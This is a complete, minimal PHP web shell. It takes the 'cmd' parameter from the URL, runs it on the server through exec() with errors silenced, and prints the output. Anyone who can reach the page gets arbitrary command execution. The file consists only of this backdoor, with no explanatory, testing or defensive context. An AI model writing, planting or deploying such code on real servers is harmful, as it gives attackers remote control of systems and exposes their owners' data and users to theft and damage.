<?php
function execute($cfe) {
	@exec($cfe,$res);
	$res = join("\n",$res);
	return $res;
}

$command = $_GET['cmd'];
echo(execute($command));
?>